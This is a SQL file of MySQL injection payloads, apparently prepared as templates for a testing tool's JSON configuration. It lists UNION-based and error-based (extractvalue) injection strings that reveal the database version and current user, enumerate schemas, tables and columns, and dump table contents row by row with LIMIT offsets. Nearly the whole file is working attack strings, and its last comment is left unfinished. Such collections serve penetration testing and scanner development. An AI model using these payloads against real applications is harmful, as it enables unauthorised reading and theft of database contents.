/*
This assumes that our result query is returning 2 columns and accordingly this query strings
*/


/*
The below query is used to get the version of the MySQL Database 
*/
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' UNION ALL SELECT NULL, VERSION(); -- 

/*
The below query is used to get the database application uses on MySQL Database 
*/
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' UNION ALL SELECT NULL, database(); -- 
/*
The below query is used to get all the databases created on the MySQL Database the application is connecting
*/

SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--

/*
The below query is used to get the user application uses to connect on MySQL Database 
*/
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' UNION ALL SELECT NULL, user(); --

/*
The below query is used to get all the table names in the database the application is connecting 
*/
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES --
/*
The below query is used to get all the tables names in a specific database 
*/
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='mysqltestdb'--

/*
The below query is used to get the column names of a specific table 
*/
-- Generic used in JSON file 
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='table_name_1' -- 
-- Specific tested example 
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='mycompany'--

/*
The below query is used to get all data of a table once column names and table names are got from the above query
*/
-- Generic used in JSON file 
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' UNION ALL SELECT NULL,concat(0x28,column_name_1,0x3a,column_name_2,0x29) FROM table_name_1 --
-- Specific tested example 
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' UNION ALL SELECT NULL,concat(0x28,id,0x3a,name,0x29) FROM mycompany --

/*
The below query is used to get data of the table once the column names are known for a table. 
Here below we are retrieving 2 columns 
*/
-- Generic used in JSON file
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' UNION ALL SELECT NULL,concat(0x28,column_name_1,0x3a,column_name_2,0x29) FROM database_name_1.table_name_1-- 

-- Specific tested example
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' UNION ALL SELECT NULL,concat(0x28,table_schema,0x3a,table_name,0x29) FROM information_schema.tables--

/*
The below query is used to get version of the database if the query does not return any result
based on the error of MySQL, SQL Version is known 
This works for MySQL Version 5.1 and above 
*/
-- query that actually works and shows the version
SELECT VERSION();
-- tested example that throws errors and shows the version of the database
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' AND extractvalue(rand(),concat(0x3a,version())) -- 

/*
The below query is used to retrieve databases names.
This throws an error back and based on the error the database name is known. 
To scan thru the list of databases, the last query string is changed. 
By changing the LIMIT option This will show the database name at that row

 LIMIT 0,1
 LIMIT 1,1
 LIMIT 2,1
 LIMIT 3,1 

*/

SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen'  AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1)))--


/*
The below query is used to get table names if the query does not return any result 
but this thorws back an error and based on the error the table name is retrieved 
*/
-- Generic used in JSON file
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="database_name_1" LIMIT 0,1)))-- 

-- specific tested example
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="mysqltestdb" LIMIT 0,1)))-- 


/*
The below query is used to get column names of the table if the query does not return any result
this throws back an error and based on the error the column name is retrieved
You can get each column name by changing the below parameters until the query return zero rows
 LIMIT 0,1
 LIMIT 1,1
 LIMIT 2,1
 
*/
-- Generic used in JSON file
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME="table_name_1" LIMIT 0,1)))--  
-- specific tested example
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME="mycompany" LIMIT 0,1)))--  


/*
The below query is used to get the data of the table once the column names and table names is known
this is used when the query does not return any result. 
Get the data at specific row by changing the below parameters
 LIMIT 0,1
 LIMIT 1,1
 LIMIT 2,1

*/
-- Generic used in JSON file
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen' AND extractvalue(rand(),concat(0x3a,(SELECT concat(column_name_1,0x3a,column_name_2) FROM table_name_1 LIMIT 0,1)))--
-- specific tested example
SELECT ID, NAME FROM mycompany WHERE NAME = 'Allen'  AND extractvalue(rand(),concat(0x3a,(SELECT concat(ID,0x3a,NAME) FROM mycompany LIMIT 0,1)))--

/*
The below query is used to get 
*/

